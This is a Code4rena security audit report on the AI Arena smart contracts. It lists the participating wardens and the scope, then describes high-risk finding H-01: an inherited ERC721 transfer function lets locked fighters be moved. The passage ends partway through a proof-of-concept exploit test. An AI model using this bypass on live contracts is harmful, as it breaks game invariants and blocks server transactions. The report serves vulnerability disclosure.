---
sponsor: "AI Arena"
slug: "2024-02-ai-arena"
date: "2024-05-14"
title: "AI Arena"
findings: "https://github.com/code-423n4/2024-02-ai-arena-findings/issues"
contest: 328
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the AI Arena smart contract system written in Solidity. The audit took place between February 9—February 21 2024.

Following the C4 audit, 3 wardens ([d3e4](https://code4rena.com/@d3e4), [fnanni](https://code4rena.com/@fnanni), and [niser93](https://code4rena.com/@niser93)) reviewed the mitigations for all identified issues; the [mitigation review report](#mitigation-review) is appended below the audit report.

## Wardens

299 Wardens contributed reports to AI Arena:

  1. [fnanni](https://code4rena.com/@fnanni)
  2. [d3e4](https://code4rena.com/@d3e4)
  3. [niser93](https://code4rena.com/@niser93)
  4. [haxatron](https://code4rena.com/@haxatron)
  5. [BARW](https://code4rena.com/@BARW) ([BenRai](https://code4rena.com/@BenRai) and [albertwh1te](https://code4rena.com/@albertwh1te))
  6. [juancito](https://code4rena.com/@juancito)
  7. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  8. [0xDetermination](https://code4rena.com/@0xDetermination)
  9. [merlinboii](https://code4rena.com/@merlinboii)
  10. [0x11singh99](https://code4rena.com/@0x11singh99)
  11. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  12. [klau5](https://code4rena.com/@klau5)
  13. [MidgarAudits](https://code4rena.com/@MidgarAudits) ([vangrim](https://code4rena.com/@vangrim) and [EVDoc](https://code4rena.com/@EVDoc))
  14. [Timenov](https://code4rena.com/@Timenov)
  15. [lil\_eth](https://code4rena.com/@lil_eth)
  16. [btk](https://code4rena.com/@btk)
  17. [givn](https://code4rena.com/@givn)
  18. [rspadi](https://code4rena.com/@rspadi)
  19. [josephdara](https://code4rena.com/@josephdara)
  20. [SovaSlava](https://code4rena.com/@SovaSlava)
  21. [Rolezn](https://code4rena.com/@Rolezn)
  22. [K42](https://code4rena.com/@K42)
  23. [Sabit](https://code4rena.com/@Sabit)
  24. [vnavascues](https://code4rena.com/@vnavascues)
  25. [0xblackskull](https://code4rena.com/@0xblackskull)
  26. [CodeWasp](https://code4rena.com/@CodeWasp) ([slylandro\_star](https://code4rena.com/@slylandro_star), [kuprum](https://code4rena.com/@kuprum), [audithare](https://code4rena.com/@audithare), and [spaghetticode\_sentinel](https://code4rena.com/@spaghetticode_sentinel))
  27. [sobieski](https://code4rena.com/@sobieski)
  28. [andywer](https://code4rena.com/@andywer)
  29. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  30. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  31. [immeas](https://code4rena.com/@immeas)
  32. [14si2o\_Flint](https://code4rena.com/@14si2o_Flint)
  33. [Draiakoo](https://code4rena.com/@Draiakoo)
  34. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  35. [Greed](https://code4rena.com/@Greed)
  36. [sashik\_eth](https://code4rena.com/@sashik_eth)
  37. [yongskiws](https://code4rena.com/@yongskiws)
  38. [0xepley](https://code4rena.com/@0xepley)
  39. [aariiif](https://code4rena.com/@aariiif)
  40. [popeye](https://code4rena.com/@popeye)
  41. [0xweb3boy](https://code4rena.com/@0xweb3boy)
  42. [abhishek\_thaku\_r](https://code4rena.com/@abhishek_thaku_r)
  43. [dimulski](https://code4rena.com/@dimulski)
  44. [0xCiphky](https://code4rena.com/@0xCiphky)
  45. [offside0011](https://code4rena.com/@offside0011)
  46. [PoeAudits](https://code4rena.com/@PoeAudits)
  47. [ahmedaghadi](https://code4rena.com/@ahmedaghadi)
  48. [yotov721](https://code4rena.com/@yotov721)
  49. [kiqo](https://code4rena.com/@kiqo)
  50. [djxploit](https://code4rena.com/@djxploit)
  51. [PedroZurdo](https://code4rena.com/@PedroZurdo) ([CaeraDenoir](https://code4rena.com/@CaeraDenoir) and [shui](https://code4rena.com/@shui))
  52. [alexzoid](https://code4rena.com/@alexzoid)
  53. [peter](https://code4rena.com/@peter)
  54. [cats](https://code4rena.com/@cats)
  55. [Tychai0s](https://code4rena.com/@Tychai0s)
  56. [lsaudit](https://code4rena.com/@lsaudit)
  57. [kartik\_giri\_47538](https://code4rena.com/@kartik_giri_47538)
  58. [ktg](https://code4rena.com/@ktg)
  59. [DarkTower](https://code4rena.com/@DarkTower) ([0xrex](https://code4rena.com/@0xrex) and [haxatron](https://code4rena.com/@haxatron))
  60. [0xAlix2](https://code4rena.com/@0xAlix2) ([a\_kalout](https://code4rena.com/@a_kalout) and [ali\_shehab](https://code4rena.com/@ali_shehab))
  61. [stakog](https://code4rena.com/@stakog)
  62. [korok](https://code4rena.com/@korok)
  63. [Aamir](https://code4rena.com/@Aamir)
  64. [pontifex](https://code4rena.com/@pontifex)
  65. [Fulum](https://code4rena.com/@Fulum)
  66. [iamandreiski](https://code4rena.com/@iamandreiski)
  67. [maxim371](https://code4rena.com/@maxim371)
  68. [0xShitgem](https://code4rena.com/@0xShitgem)
  69. [radev\_sw](https://code4rena.com/@radev_sw)
  70. [alexxander](https://code4rena.com/@alexxander)
  71. [zaevlad](https://code4rena.com/@zaevlad)
  72. [t0x1c](https://code4rena.com/@t0x1c)
  73. [McToady](https://code4rena.com/@McToady)
  74. [Krace](https://code4rena.com/@Krace)
  75. [evmboi32](https://code4rena.com/@evmboi32)
  76. [0xBinChook](https://code4rena.com/@0xBinChook)
  77. [MatricksDeCoder](https://code4rena.com/@MatricksDeCoder)
  78. [ke1caM](https://code4rena.com/@ke1caM)
  79. [ubl4nk](https://code4rena.com/@ubl4nk)
  80. [forkforkdog](https://code4rena.com/@forkforkdog)
  81. [sl1](https://code4rena.com/@sl1)
  82. [swizz](https://code4rena.com/@swizz)
  83. [solmaxis69](https://code4rena.com/@solmaxis69) ([seeques](https://code4rena.com/@seeques) and [melihdhs](https://code4rena.com/@melihdhs))
  84. [Aymen0909](https://code4rena.com/@Aymen0909)
  85. [grearlake](https://code4rena.com/@grearlake)
  86. [VAD37](https://code4rena.com/@VAD37)
  87. [bhilare\_](https://code4rena.com/@bhilare_)
  88. [Kow](https://code4rena.com/@Kow)
  89. [Zac](https://code4rena.com/@Zac)
  90. [0xLogos](https://code4rena.com/@0xLogos)
  91. [web3pwn](https://code4rena.com/@web3pwn)
  92. [jnforja](https://code4rena.com/@jnforja)
  93. [rouhsamad](https://code4rena.com/@rouhsamad)
  94. [BoRonGod](https://code4rena.com/@BoRonGod)
  95. [Tricko](https://code4rena.com/@Tricko)
  96. [0brxce](https://code4rena.com/@0brxce)
  97. [zxriptor](https://code4rena.com/@zxriptor)
  98. [Kalogerone](https://code4rena.com/@Kalogerone)
  99. [visualbits](https://code4rena.com/@visualbits)
  100. [Velislav4o](https://code4rena.com/@Velislav4o)
  101. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  102. [shaflow2](https://code4rena.com/@shaflow2)
  103. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  104. [ladboy233](https://code4rena.com/@ladboy233)
  105. [Shubham](https://code4rena.com/@Shubham)
  106. [nuthan2x](https://code4rena.com/@nuthan2x)
  107. [jesjupyter](https://code4rena.com/@jesjupyter)
  108. [favelanky](https://code4rena.com/@favelanky)
  109. [0xvj](https://code4rena.com/@0xvj)
  110. [SAQ](https://code4rena.com/@SAQ)
  111. [JcFichtner](https://code4rena.com/@JcFichtner)
  112. [\_eperezok](https://code4rena.com/@_eperezok)
  113. [PetarTolev](https://code4rena.com/@PetarTolev)
  114. [sandy](https://code4rena.com/@sandy)
  115. [0xStriker](https://code4rena.com/@0xStriker)
  116. [kutugu](https://code4rena.com/@kutugu)
  117. [Bauchibred](https://code4rena.com/@Bauchibred)
  118. [peanuts](https://code4rena.com/@peanuts)
  119. [pynschon](https://code4rena.com/@pynschon)
  120. [0xAsen](https://code4rena.com/@0xAsen)
  121. [yovchev\_yoan](https://code4rena.com/@yovchev_yoan)
  122. [oualidpro](https://code4rena.com/@oualidpro)
  123. [rekxor](https://code4rena.com/@rekxor)
  124. [pipidu83](https://code4rena.com/@pipidu83)
  125. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  126. [hassanshakeel13](https://code4rena.com/@hassanshakeel13)
  127. [ansa-zanjbeel](https://code4rena.com/@ansa-zanjbeel)
  128. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  129. [tala7985](https://code4rena.com/@tala7985)
  130. [0xbrett8571](https://code4rena.com/@0xbrett8571)
  131. [wahedtalash77](https://code4rena.com/@wahedtalash77)
  132. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  133. [foxb868](https://code4rena.com/@foxb868)
  134. [Myd](https://code4rena.com/@Myd)
  135. [0xblack\_bird](https://code4rena.com/@0xblack_bird)
  136. [cudo](https://code4rena.com/@cudo)
  137. [clara](https://code4rena.com/@clara)
  138. [scokaf](https://code4rena.com/@scokaf) ([Scoon](https://code4rena.com/@Scoon) and [jauvany](https://code4rena.com/@jauvany))
  139. [albahaca](https://code4rena.com/@albahaca)
  140. [JayShreeRAM](https://code4rena.com/@JayShreeRAM)
  141. [0xRiO](https://code4rena.com/@0xRiO)
  142. [shaka](https://code4rena.com/@shaka)
  143. [0xE1](https://code4rena.com/@0xE1)
  144. [AlexCzm](https://code4rena.com/@AlexCzm)
  145. [emrekocak](https://code4rena.com/@emrekocak)
  146. [al88nsk](https://code4rena.com/@al88nsk)
  147. [mikesans](https://code4rena.com/@mikesans)
  148. [SY\_S](https://code4rena.com/@SY_S)
  149. [SM3\_SS](https://code4rena.com/@SM3_SS)
  150. [shamsulhaq123](https://code4rena.com/@shamsulhaq123)
  151. [donkicha](https://code4rena.com/@donkicha)
  152. [dharma09](https://code4rena.com/@dharma09)
  153. [unique](https://code4rena.com/@unique)
  154. [Raihan](https://code4rena.com/@Raihan)
  155. [yashgoel72](https://code4rena.com/@yashgoel72)
  156. [lrivo](https://code4rena.com/@lrivo)
  157. [0xAnah](https://code4rena.com/@0xAnah)
  158. [ziyou-](https://code4rena.com/@ziyou-)
  159. [judeabara](https://code4rena.com/@judeabara)
  160. [Blank\_Space](https://code4rena.com/@Blank_Space) ([bLnk](https://code4rena.com/@bLnk) and [10ambear](https://code4rena.com/@10ambear))
  161. [0xmystery](https://code4rena.com/@0xmystery)
  162. [agadzhalov](https://code4rena.com/@agadzhalov)
  163. [KmanOfficial](https://code4rena.com/@KmanOfficial)
  164. [cartlex\_](https://code4rena.com/@cartlex_)
  165. [EagleSecurity](https://code4rena.com/@EagleSecurity) ([mitev](https://code4rena.com/@mitev) and [alexander\_orjustalex](https://code4rena.com/@alexander_orjustalex))
  166. [0xMosh](https://code4rena.com/@0xMosh)
  167. [DeFiHackLabs](https://code4rena.com/@DeFiHackLabs) ([IceBear](https://code4rena.com/@IceBear), [SunSec](https://code4rena.com/@SunSec), and [ret2basic](https://code4rena.com/@ret2basic))
  168. [BigVeezus](https://code4rena.com/@BigVeezus)
  169. [Tekken](https://code4rena.com/@Tekken)
  170. [0xAkira](https://code4rena.com/@0xAkira)
  171. [7ashraf](https://code4rena.com/@7ashraf)
  172. [Bube](https://code4rena.com/@Bube)
  173. [SHA\_256](https://code4rena.com/@SHA_256)
  174. [BenasVol](https://code4rena.com/@BenasVol)
  175. [boredpukar](https://code4rena.com/@boredpukar)
  176. [c0pp3rscr3w3r](https://code4rena.com/@c0pp3rscr3w3r)
  177. [0xgrbr](https://code4rena.com/@0xgrbr)
  178. [Giorgio](https://code4rena.com/@Giorgio)
  179. [aslanbek](https://code4rena.com/@aslanbek)
  180. [petro\_1912](https://code4rena.com/@petro_1912)
  181. [n0kto](https://code4rena.com/@n0kto)
  182. [VrONTg](https://code4rena.com/@VrONTg)
  183. [handsomegiraffe](https://code4rena.com/@handsomegiraffe)
  184. [denzi\_](https://code4rena.com/@denzi_)
  185. [csanuragjain](https://code4rena.com/@csanuragjain)
  186. [ubermensch](https://code4rena.com/@ubermensch)
  187. [erosjohn](https://code4rena.com/@erosjohn)
  188. [Silvermist](https://code4rena.com/@Silvermist)
  189. [pkqs90](https://code4rena.com/@pkqs90)
  190. [0xlemon](https://code4rena.com/@0xlemon)
  191. [WoolCentaur](https://code4rena.com/@WoolCentaur)
  192. [FloatingPragma](https://code4rena.com/@FloatingPragma) ([Stoicov](https://code4rena.com/@Stoicov) and [nmirchev8](https://code4rena.com/@nmirchev8))
  193. [soliditywala](https://code4rena.com/@soliditywala)
  194. [Ryonen](https://code4rena.com/@Ryonen)
  195. [Abdessamed](https://code4rena.com/@Abdessamed)
  196. [radin100](https://code4rena.com/@radin100)
  197. [blutorque](https://code4rena.com/@blutorque)
  198. [0rpse](https://code4rena.com/@0rpse)
  199. [Tendency](https://code4rena.com/@Tendency)
  200. [krikolkk](https://code4rena.com/@krikolkk)
  201. [Topmark](https://code4rena.com/@Topmark)
  202. [zhaojohnson](https://code4rena.com/@zhaojohnson)
  203. [matejdb](https://code4rena.com/@matejdb)
  204. [Honour](https://code4rena.com/@Honour)
  205. [israeladelaja](https://code4rena.com/@israeladelaja)
  206. [ni8mare](https://code4rena.com/@ni8mare)
  207. [YouCrossTheLineAlfie](https://code4rena.com/@YouCrossTheLineAlfie)
  208. [neocrao](https://code4rena.com/@neocrao)
  209. [0xAadi](https://code4rena.com/@0xAadi)
  210. [forgebyola](https://code4rena.com/@forgebyola)
  211. [Merulez99](https://code4rena.com/@Merulez99)
  212. [Varun\_05](https://code4rena.com/@Varun_05)
  213. [devblixt](https://code4rena.com/@devblixt)
  214. [0xWallSecurity](https://code4rena.com/@0xWallSecurity)
  215. [dutra](https://code4rena.com/@dutra)
  216. [Matue](https://code4rena.com/@Matue)
  217. [Tumelo\_Crypto](https://code4rena.com/@Tumelo_Crypto)
  218. [KupiaSec](https://code4rena.com/@KupiaSec)
  219. [JCN](https://code4rena.com/@JCN)
  220. [AC000123](https://code4rena.com/@AC000123)
  221. [ADM](https://code4rena.com/@ADM)
  222. [stackachu](https://code4rena.com/@stackachu)
  223. [0xKowalski](https://code4rena.com/@0xKowalski)
  224. [0xAleko](https://code4rena.com/@0xAleko)
  225. [OMEN](https://code4rena.com/@OMEN)
  226. [adamn000](https://code4rena.com/@adamn000)
  227. [Archime](https://code4rena.com/@Archime)
  228. [0xaghas](https://code4rena.com/@0xaghas)
  229. [novamanbg](https://code4rena.com/@novamanbg)
  230. [xchen1130](https://code4rena.com/@xchen1130)
  231. [0xbranded](https://code4rena.com/@0xbranded)
  232. [linmiaomiao](https://code4rena.com/@linmiaomiao)
  233. [AgileJune](https://code4rena.com/@AgileJune)
  234. [Davide](https://code4rena.com/@Davide)
  235. [Jorgect](https://code4rena.com/@Jorgect)
  236. [okolicodes](https://code4rena.com/@okolicodes)
  237. [0xabhay](https://code4rena.com/@0xabhay)
  238. [0xG0P1](https://code4rena.com/@0xG0P1)
  239. [merlin](https://code4rena.com/@merlin)
  240. [almurhasan](https://code4rena.com/@almurhasan)
  241. [tallo](https://code4rena.com/@tallo)
  242. [0xlamide](https://code4rena.com/@0xlamide)
  243. [dipp](https://code4rena.com/@dipp)
  244. [ReadyPlayer2](https://code4rena.com/@ReadyPlayer2)
  245. [0x13](https://code4rena.com/@0x13)
  246. [deadrxsezzz](https://code4rena.com/@deadrxsezzz)
  247. [Nyxaris](https://code4rena.com/@Nyxaris)
  248. [inzinko](https://code4rena.com/@inzinko)
  249. [cu5t0mpeo](https://code4rena.com/@cu5t0mpeo)
  250. [Avci](https://code4rena.com/@Avci) ([0xdanial](https://code4rena.com/@0xdanial) and [0xArshia](https://code4rena.com/@0xArshia))
  251. [0xPluto](https://code4rena.com/@0xPluto)
  252. [jesusrod15](https://code4rena.com/@jesusrod15)
  253. [taner2344](https://code4rena.com/@taner2344)
  254. [y4y](https://code4rena.com/@y4y)
  255. [Fitro](https://code4rena.com/@Fitro)
  256. [GoSlang](https://code4rena.com/@GoSlang)
  257. [Cryptor](https://code4rena.com/@Cryptor)
  258. [pa6kuda](https://code4rena.com/@pa6kuda)
  259. [thank\_you](https://code4rena.com/@thank_you)
  260. [dvrkzy](https://code4rena.com/@dvrkzy)
  261. [Pelz](https://code4rena.com/@Pelz)
  262. [GhK3Ndf](https://code4rena.com/@GhK3Ndf)
  263. [Limbooo](https://code4rena.com/@Limbooo)
  264. [hulkvision](https://code4rena.com/@hulkvision)
  265. [jaydhales](https://code4rena.com/@jaydhales)
  266. [Josh4324](https://code4rena.com/@Josh4324)
  267. [DMoore](https://code4rena.com/@DMoore)
  268. [adam-idarrha](https://code4rena.com/@adam-idarrha)
  269. [0xlyov](https://code4rena.com/@0xlyov)
  270. [0xGreyWolf](https://code4rena.com/@0xGreyWolf)
  271. [tpiliposian](https://code4rena.com/@tpiliposian)
  272. [0xkaju](https://code4rena.com/@0xkaju)
  273. [honey-k12](https://code4rena.com/@honey-k12)
  274. [bgsmallerbear](https://code4rena.com/@bgsmallerbear)
  275. [PUSH0](https://code4rena.com/@PUSH0) ([jojo](https://code4rena.com/@jojo) and [thekmj](https://code4rena.com/@thekmj))
  276. [gesha17](https://code4rena.com/@gesha17)
  277. [desaperh](https://code4rena.com/@desaperh)
  278. [Daniel526](https://code4rena.com/@Daniel526)
  279. [m4ttm](https://code4rena.com/@m4ttm)
  280. [0xprinc](https://code4rena.com/@0xprinc)
  281. [Breeje](https://code4rena.com/@Breeje)
  282. [0xpoor4ever](https://code4rena.com/@0xpoor4ever)

The original audit was judged by [hickuphh3](https://code4rena.com/@hickuphh3).

The mitigation review was judged by [ronnyx2017](https://code4rena.com/@ronnyx2017).

Final report assembled by PaperParachute and [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 17 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 9 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 60 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 36 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 AI Arena repository](https://github.com/code-423n4/2024-02-ai-arena), and is composed of 9 smart contracts written in the Solidity programming language and includes 1271 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **TragedyOTCommons** from warden [IllIllI](https://code4rena.com/@illilli), generated the [Automated Findings report](https://github.com/code-423n4/2024-02-ai-arena/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (8)
## [[H-01] A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1709)
*Submitted by [CodeWasp](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1709), also found by [adam-idarrha](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2037), [d3e4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2026), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1999), [c0pp3rscr3w3r](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1945), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1918), [GhK3Ndf](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1872), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1819), [Fulum](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1815), [thank\_you](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1763), [denzi\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1733), [Limbooo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1732), [korok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1707), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1702), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1622), [grearlake](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1560), [ktg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1544), [radev\_sw](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1530), [rouhsamad](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1476), [KmanOfficial](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1465), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1386), [KupiaSec](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1380), [0xaghas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1357), [Bauchibred](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1344), [jaydhales](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1291), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1262), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1245), [soliditywala](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1223), [sashik\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1194), [0xLogos](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1153), [Tendency](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1139), [0x13](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1137), [PedroZurdo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1134), [al88nsk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1111), ladboy233 ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1103), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1096)), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1084), [DanielArmstrong](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1067), [hulkvision](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1058), [israeladelaja](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/993), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/987), [ADM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/967), [petro\_1912](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/965), [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/958), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/912), [peanuts](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/860), [cats](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/857), [0xAsen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/852), [stackachu](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/848), [deadrxsezzz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/824), [Krace](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/817), [jnforja](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/814), [0xvj](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/784), [\_eperezok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/771), [pkqs90](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/766), [Josh4324](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/761), [web3pwn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/741), [Aamir](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/739), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/679), pynschon ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/647), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/642)), [0xE1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/537), [ubl4nk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/532), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/443), [devblixt](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/434), [cartlex\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/416), [erosjohn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/389), [BARW](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/374), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/372), [zhaojohnson](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/361), [blutorque](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/272), [Kalogerone](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/271), [DMoore](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/252), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/251), [0xlemon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/233), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/231), [0xAlix2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/225), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/208), [novamanbg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/202), [sobieski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/184), [xchen1130](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/164), [matejdb](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/147), [tallo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/143), [Pelz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/84), [oualidpro](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/55), [aslanbek](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/54), and [0xlyov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/991)*

`FighterFarm` contract implements restrictions on the transferability of fighters in functions [transferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L338-L348) and [safeTransferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L355-L365), via the call to function [\_ableToTransfer()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L539-L545). Unfortunately this approach doesn't cover all possible ways to transfer a fighter:  The `FighterFarm` contract inherits from OpenZeppelin's `ERC721` contract, which includes the public function [safeTransferFrom(..., data)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC721/ERC721.sol#L175-L183), i.e. the same as `safeTransferFrom()` but with the additional `data` parameter. This inherited function becomes available in the `GameItems` contract, and calling it allows us to circumvent the transferability restriction. As a result, a player will be able to transfer any of their fighters, irrespective of whether they are locked or not. Violation of such a basic system invariant leads to various kinds of impacts, including:

*   The game server won't be able to commit some transactions;
*   The transferred fighter becomes unstoppable (a transaction in which it loses can't be committed);
*   The transferred fighter may be used as a "poison pill" to spoil another player, and prevent it from leaving the losing zone (a transaction in which it wins can't be committed).

Both of the last two impacts include the inability of the game server to commit certain transactions, so we illustrate both of the last two with PoCs, thus illustrating the first one as well.

### Impact 1: A fighter becomes unstoppable, game server unable to commit

If a fighter wins a battle, [points are added](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L467) to [accumulatedPointsPerAddress mapping](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L113). When a fighter loses a battle, the reverse happens: [points are subtracted](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L486). If a fighter is transferred after it wins the battle to another address, `accumulatedPointsPerAddress` for the new address is empty, and thus the points can't be subtracted: **the game server transaction will be reverted**. By transferring the fighter to a new address after each battle, **the fighter becomes unstoppable**, as its accumulated points will only grow, and will never decrease.

### Impact 2: Another fighter can't win, game server unable to commit

If a fighter loses a battle, funds are transferred from the amount at stake, to the stake-at risk, which is reflected in the [amountLost mapping](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/StakeAtRisk.sol#L48-L49) of `StakeAtRisk` contract. If the fighter with stake-at-risk is transferred to another player, the invariant that `amountLost` reflects the lost amount per address is violated: after the transfer the second player has more stake-at-risk than before. A particular way to exploit this violation is demonstrated below: the transferred fighter may win a battle, which leads to [reducing amountLost](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/StakeAtRisk.sol#L104) by the corresponding amount. Upon subsequent wins of the second player own fighters, this operation will underflow, leading to **the game server unable to commit transactions**, and **the player unable to exit the losing zone**. This effectively makes a fighter with the stake-at-risk a "poison pill".

### Proof of Concept

### Impact 1: A fighter becomes unstoppable, game server unable to commit

<details>

```diff
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
index 6c5a1d7..dfaaad4 100644
--- a/test/RankedBattle.t.sol
+++ b/test/RankedBattle.t.sol
@@ -465,6 +465,31 @@ contract RankedBattleTest is Test {
         assertEq(unclaimedNRN, 5000 * 10 ** 18);
     }
 
+   /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!
+    function testExploitTransferStakedFighterAndPlay() public {
+        address player = vm.addr(3);
+        address otherPlayer = vm.addr(4);
+        _mintFromMergingPool(player);
+        uint8 tokenId = 0;
+        _fundUserWith4kNeuronByTreasury(player);
+        vm.prank(player);
+        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);
